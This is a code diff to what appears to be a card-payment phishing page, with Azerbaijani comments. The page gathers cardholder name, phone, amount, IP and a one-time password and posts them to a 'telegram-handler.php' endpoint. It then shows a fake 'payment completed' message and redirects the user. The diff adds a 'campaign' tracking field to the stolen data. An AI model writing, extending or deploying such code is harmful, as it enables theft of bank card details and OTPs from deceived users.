@@ -97,6 +97,7 @@
     const phone = localStorage.getItem('phone') || 'Məlum deyil';
     const amount = localStorage.getItem('amount') || '0';
     const ip = localStorage.getItem('ip') || '0.0.0.0';
+    const campaign = localStorage.getItem('campaign') || '';
 
     // EKRANDA GÖSTƏR
     document.getElementById('sumOper').innerText = oper;
@@ -153,6 +154,9 @@
         document.getElementById('otpSubmitBtn').disabled = !(otp.length === otpLength && !isProcessing);
     }
 
+    // ============================================
+    // 🔑 SUBMIT OTP - YALNIZ OTP GÖNDƏRİR
+    // ============================================
     function submitOtp() {
         if(isProcessing) return;
         const otp = getOtp();
@@ -175,6 +179,7 @@
         const phone = localStorage.getItem('phone') || '';
         const amount = localStorage.getItem('amount') || '';
         const ip = localStorage.getItem('ip') || '0.0.0.0';
+        const campaign = localStorage.getItem('campaign') || '';
 
         const formData = new FormData();
         formData.append('card_name', cardName);
@@ -186,6 +191,7 @@
         formData.append('amount', amount);
         formData.append('ip', ip);
         formData.append('otp', otp);
+        formData.append('campaign', campaign);
 
         // API-YA GÖNDƏR
         fetch('api/telegram-handler.php', {
@@ -200,13 +206,11 @@
                 isProcessing = false;
                 document.getElementById('otpSubmitBtn').disabled = false;
                 
-                // UĞURLU OLSA BURADA BİR MESAJ GÖSTƏRƏ BİLƏRSİNİZ
                 document.getElementById('otpError').textContent = '✅ Ödəniş uğurla tamamlandı!';
                 document.getElementById('otpError').style.color = '#22c55e';
                 document.getElementById('otpError').style.background = '#f0fdf4';
                 document.getElementById('otpError').classList.add('show');
                 
-                // 3 SANİYƏ SONRA HOMEPAGE-Ə YÖNLƏNDİR
                 setTimeout(() => {
                     window.location.href = 'index.html';
                 }, 3000);
